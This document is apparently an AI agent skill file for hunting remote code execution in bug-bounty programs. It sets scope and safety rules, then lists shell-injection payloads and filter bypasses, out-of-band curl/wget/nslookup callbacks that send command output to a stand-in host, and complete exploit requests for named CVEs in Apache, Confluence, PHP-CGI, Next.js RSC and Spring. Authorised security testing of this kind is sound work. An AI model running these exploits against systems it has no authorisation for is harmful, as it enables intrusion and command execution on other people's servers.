---
name: hunt-rce
description: Hunting skill for rce vulnerabilities. Built from 67 public bug bounty reports. Use when hunting rce on any target.
sources: github, hackerone_public
report_count: 67
---

# HUNT-RCE — Command and code execution

RCE means the server ran a command or code you supplied and you can show the result. A stack trace, a `49` from a template, a deserialized object, or "the upload returned 200" is a lead — hand it to the matching skill and finish the proof there.

## Rails
- In-scope only. One harmless command (`id`, `whoami`, `hostname`) or one OOB callback that contains that output.
- No reverse/bind shells, no cron or webshell left on disk, no `rm`, no fork bombs, no ransomware-style writes.
- No password cracking and no credential stuffing, including "leaked creds" to reach an admin panel.
- Dependency-confusion and exposed admin consoles are in-scope only when the program allows that action. A canary callback is the proof; delete the canary after.
- Do not create cluster pods, do not `hostPID`, do not enable `xp_cmdshell`. Stop at draft. Never auto-submit.
- Claim the user you actually ran as. "Could lead to RCE" is not a finding.

## Decision tree

1. **Name the interpreter** before choosing a payload. Shell (`sh`/`cmd`), language `eval` (PHP/Node/Python — metacharacters will not help), template (`hunt-ssti`), deserializer (`hunt-deserialization`), file include (`hunt-lfi`), expression language (SpEL, OGNL, EL), SQL `COPY`/`xp_cmdshell` (`hunt-sqli`), upload handler (`hunt-file-upload`). Wrong family = noisy false positives.
2. **Baseline** the parameter (URL, body, filename, archive entry, image metadata, webhook, "test connection", export, PDF, CI script, admin config field).
3. **Detection, in order, stop at the first hit.**
   - Output: `; id` / `| id` / `$(id)` / `` `id` `` and the Windows pair `& whoami`. Look for `uid=` or a domain\user in the body.
   - Time: `; sleep 2` vs `; sleep 0`, interleaved n≥10, non-overlapping or Welch t > 3. Windows: `& ping -n 3 127.0.0.1` (three pings ≈ 2s, not a flood).
   - OOB: `; curl http://UNIQUE.collab/$(whoami)` or `nslookup UNIQUE.collab`. One host per sink.
4. **If metacharacters die but the value is an argument** (git URL, curl URL, find path, tar file, ImageMagick file, office converter): argument injection (`--upload-pack`, `-o`, `--config`) with the same OOB proof. Do not switch to a memory-corruption exploit.
5. **If the sink is a known product**, test that fingerprint only when the banner, endpoint, or error matches the row in the table. A version number alone is not RCE.
6. **Stop** when one callback or one `uid=` line is captured. Write the OS user, the host, and the request. Redact secrets (`evidence-hygiene`).

## Shell payloads

```
;id
|id
||id
&&id
$(id)
`id`
%0aid
;sleep 2
$(sleep 2)
;curl http://UNIQUE.collab/$(id|base64)
```
```
& whoami
| whoami
& ping -n 3 127.0.0.1
& nslookup UNIQUE.collab
```
Newline (`%0a`) when `;` is stripped. Spaces blocked: `cat${IFS}/etc/passwd`, `{id}`. Keyword blocked: `$(printf '\x69\x64')`, `i''d`. Quote the bypass that worked, not the whole list.

Argument injection (value reaches `execve` without a shell): a leading `-` or a second argument. Confirm with OOB, because there is often no stdout. Example shapes: `git clone --upload-pack='curl http://UNIQUE.collab/'`, `curl --output /dev/stdout file://...` only if you then see file bytes.

Language-eval (error/stack names PHP, Node, or Python and `;id` does nothing): the value is source, not a shell string.
```
system('id');                 # PHP
<?=`id`?>
require('child_process').execSync('id')     # Node; if mainModule is null: process.getBuiltinModule('child_process')
__import__('os').popen('id').read()         # Python
```

## Product fingerprints

Test the row only when the signal is present. Proof column is mandatory; a matching version is not.

| Signal | Probe | Proof |
|---|---|---|
| Apache 2.4.49 or 2.4.50 | `curl --path-as-is`. 2.4.49: `/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd`. 2.4.50 (CVE-2021-42013, single-encode patched): replace `.%2e` with `%%32%65` | `root:x:0:0:` = file read. CGI RCE is a different impact: POST `-d 'echo;id'` to `/cgi-bin/<traversal>/bin/sh` and read `uid=` |
| Spring Cloud Function 3.0.x, 3.1.0–3.1.6, 3.2.0–3.2.2 and `/functionRouter` (fixed 3.1.7 / 3.2.3) | Header `spring.cloud.function.routing-expression` (CVE-2022-22963) | OOB from `T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/"})`. `exec(String)` is not a shell |
| Windows PHP **CGI** (`php-cgi.exe`, XAMPP, `Server API: CGI`) | CVE-2024-4577, one POST (below). Best-fit of `%AD`→`-` is locale-dependent (Chinese/Japanese code pages). A miss is "not shown", not "patched" | `uid=` from `shell_exec('id')`. Raw PHP source with no `uid=` is disclosure, not RCE |
| Tomcat 9.0.0-M1–9.0.98, 10.1.0-M1–10.1.34, 11.0.0-M1–11.0.2 | CVE-2025-24813: one partial `PUT` with `Content-Range: bytes 0-3/10` | A 201 is a **lead**. RCE needs `readonly=false` (off by default) **and** FileStore sessions **and** a gadget. One DNS gadget via `hunt-deserialization`. No webshell |
| Next.js App Router / RSC (`Next-Action`, `text/x-component`, `react-server-dom-*` 19.0.0, 19.1.0, 19.1.1, 19.2.0) | CVE-2025-55182 Flight body (below). Fixed in 19.0.1 / 19.1.2 / 19.2.1. Later RSC advisories are DoS or source read — do not send a hanging payload | OOB whose query is `id` output, or `uid=` in the body. A 500 digest alone is not RCE |
| Spring MVC JDK9+ data binding on a property the app should not bind (CVE-2022-22965) | `class.module.classLoader...` pattern only on a fingerprinted vulnerable stack | OOB or a log line you can read. Do not spray this at every Spring app |
| Confluence only, CVE-2022-26134 / CVE-2023-22527 | URI OGNL that runs `id` and returns it in a response header (below). 2023-22527 is the `text-inline.vm` parameter on a matching version | header or body contains `uid=`. No webshell, no follow-up drop |
| Jenkins `/cli` plus args4j (CVE-2024-23897) | `help 1 @/etc/passwd` via the CLI jar | file bytes in the error text. This is a file read; call it RCE only if you also executed a command |
| SnakeYAML / Ruby `YAML.load` / XStream | `hunt-deserialization` URLDNS-style callback or `!!javax.script` / `!ruby/object` | OOB or `id`. Do not point a classloader at an exploit JAR until a DNS gadget has already fired |
| Admin "config" field for a daemon (syslog destination, collectd plugin, nomad/template, CI script) | template math from `hunt-ssti`, or a single `id` in the program field | output or one callback after the job runs |
| `kubectl` / `:6443` anonymous API | `GET /version` and `GET /api/v1/namespaces` | JSON from the API. Stop. Do not create workloads |
| Internal package name in a lockfile or error | public registry has no such name, program allows a canary | one install callback, then unpublish |

Apache path-as-is note: curl normalizes `%2e` unless `--path-as-is` is set. File read and CGI RCE are different impacts — report the one you showed. 2.4.50 needs double-encoding (`%%32%65`); `.%2e` there is a miss, not "patched past 2.4.50". CGI proof:
```
curl --path-as-is -d 'echo;id' "https://$TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"                  # 2.4.49
curl --path-as-is -d 'echo;id' "https://$TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"  # 2.4.50
```

Confluence CVE-2022-26134, only when the product is Confluence Server/DC. One path. URL-encode it (`$`→`%24`, `{`→`%7B`, `}`→`%7D`, spaces→`%20`) and use `curl --path-as-is` — a raw `${` in the path is a different request. Read `X-Cmd-Response`. Do not write a file.
```
/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}/
```
CVE-2023-22527 is Confluence Server/DC **8.0.0–8.5.3** only (fixed 8.5.4). `*.atlassian.net` Cloud is not this bug. One POST, then stop. Header `X-Cmd-Response` must contain `uid=`.
```
POST /template/aui/text-inline.vm
Content-Type: application/x-www-form-urlencoded

label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({"id"}))
```

PHP CGI (CVE-2024-4577), one POST, only after a CGI/Windows signal. Marker is `uid=`, not a file drop.
```
POST /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
Content-Type: application/x-www-form-urlencoded

<?php echo shell_exec('id'); ?>
```

RSC (CVE-2025-55182), one POST to the App Router host. `execSync` is a shell, so `$(id)` runs. If `mainModule` is null, swap in `process.getBuiltinModule('child_process')`. Callback query must be the `id` output.
```
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=----hunt

------hunt
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('curl http://UNIQUE.collab/$(id|base64 -w0)')","_formData":{"get":"$1:constructor:constructor"}}}
------hunt
Content-Disposition: form-data; name="1"

"$@0"
------hunt--
```

## Out of band

```
curl http://UNIQUE.collab/rce
nslookup UNIQUE.collab
wget -q -O- http://UNIQUE.collab/$(whoami)
```
Unique subdomain per sink so a late hit is attributable. A callback proves the command ran on a host that can reach you. It does not prove `root`. If the output is in the path (`/$(whoami)`), quote it.

Java `Runtime.exec(String)` tokenizes on spaces and does not run a shell. Use `String[]` or `{"/bin/sh","-c","id"}` when the probe is SpEL/OGNL. Python `subprocess` with `shell=False` ignores `;`. Match the API.

## Validation
- **Confirmed:** `uid=` / `whoami` text that you did not send as the parameter, or an OOB hit whose label/path is the command output, or a file you created and then fetched containing a marker (delete the marker).
- **Timing:** n≥10 interleaved; a single 2s blip is not enough.
- **Not RCE:** template `49` with a sandbox error (`hunt-ssti`), URLDNS or Log4j DNS with no command (`hunt-deserialization`), file contents with no exec (`hunt-lfi`), upload stored but not executed (`hunt-file-upload`), `exec` returned and the process might have started but you have no callback and no output.
- **Severity:** command execution as the app user is Critical when you show it. A sandboxed `id` that cannot touch the environment is whatever you showed, not "full compromise".

## Chains
- SQLi on Postgres/MSSQL → one `COPY ... TO PROGRAM 'curl http://UNIQUE.collab/'` or one `xp_cmdshell` **if it is already enabled**.
- SSTI gadget → this proof. Do not file both for the same request.
- Upload or LFI → one request to the script URL that prints `id`.
- SSRF → a loopback admin port that runs a script console (Jenkins script console, notebook). One command. IMDSv1 credential JSON is cloud-account impact, not host RCE; IMDSv2 GET without a token is not credentials.
- Prototype pollution → `child_process` / `NODE_OPTIONS` only when the callback fires. Pollution by itself is not RCE.
- ViewState / phar / pickle → `hunt-deserialization` proof, then cite this skill for impact wording.

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
